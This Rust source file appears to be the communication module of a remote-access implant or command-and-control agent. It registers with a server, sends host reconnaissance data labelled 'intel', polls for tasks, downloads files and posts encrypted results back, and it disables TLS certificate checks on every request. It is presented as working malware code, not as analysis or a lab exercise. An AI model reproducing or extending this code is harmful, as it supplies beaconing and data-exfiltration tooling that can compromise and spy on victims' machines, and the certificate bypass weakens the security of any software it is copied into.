use reqwest::{Client};
use reqwest::Method;
use serde::{Serialize, Deserialize};
use std::collections::HashMap;
use std::str;
use serde_json;
use crate::internal::{config, intel};
use crate::internal::crypto::{encrypt_data};

#[derive(Serialize, Deserialize, PartialEq, Debug)]
pub struct Message {
    pub id: String,
    pub data: String,
}

impl Message {
    pub fn from_json(id: String, key: String, data: Vec<u8>) -> Message {
        let json_data = data;
        let encrypted_data = encrypt_data(json_data, key.as_bytes());

        return Message {
            id, data: encrypted_data
        };
    }
}

fn get_client() -> Client {
    return Client::builder()
        .danger_accept_invalid_certs(true)
        .default_headers(config::headers())
        .build()
        .unwrap();
}

pub(crate) async fn initiate() -> Result<HashMap<String, String>, Box<dyn std::error::Error>> {
    let client = get_client();

    let res = client
        .request(Method::GET, config::endpoint(config::Endpoint::REGISTER))
        .send()
        .await?.
        json::<HashMap<String, String>>()
        .await?;

    Ok(res)
}

pub(crate) async fn register(id: String, key: String) -> Result<HashMap<String, String>, Box<dyn std::error::Error>> {
    let client = get_client();

    let data = intel::initial_data();
    let json_data = serde_json::to_vec(&data).unwrap();
    let message = Message::from_json(id.clone(), key, json_data);

    let res = client
        .request(Method::POST, config::endpoint_for_id(config::Endpoint::REGISTER, id))
        .json(&message)
        .send()
        .await?.
        json::<HashMap<String, String>>()
        .await?;

    Ok(res)
}

pub(crate) async fn get_task(id: String) -> Result<HashMap<String, String>, Box<dyn std::error::Error>> {
    let client = get_client();

    let res = client
        .request(Method::GET, config::endpoint_for_id(config::Endpoint::TASK, id))
        .send()
        .await?.
        json::<HashMap<String, String>>()
        .await?;

    Ok(res)
}


pub(crate) async fn get_uploaded_file(id: String, file_id: String) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let url = config::endpoint_for_file(id, file_id);

    return get_file(url).await;
}

pub(crate) async fn get_file(url: String) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let client = get_client();

    let bytes = client
        .request(Method::GET, url)
        .send()
        .await?
        .bytes()
        .await?;

    Ok(bytes.to_vec())
}

pub(crate) async fn get_content(url: String) -> Result<String, Box<dyn std::error::Error>> {
    let client = get_client();

    let content = client
        .request(Method::GET, url)
        .send()
        .await?
        .text()
        .await?;

    Ok(content)
}

pub(crate) async fn send_result(id: String, key: String, data: String) -> Result<HashMap<String, String>, Box<dyn std::error::Error>> {
    let client = get_client();

    let message = Message::from_json(id.clone(), key, data.as_bytes().to_vec());

    let res = client
        .request(Method::POST, config::endpoint_for_id(config::Endpoint::RESULT, id))
        .json(&message)
        .send()
        .await?.
        json::<HashMap<String, String>>()
        .await?;

    Ok(res)
}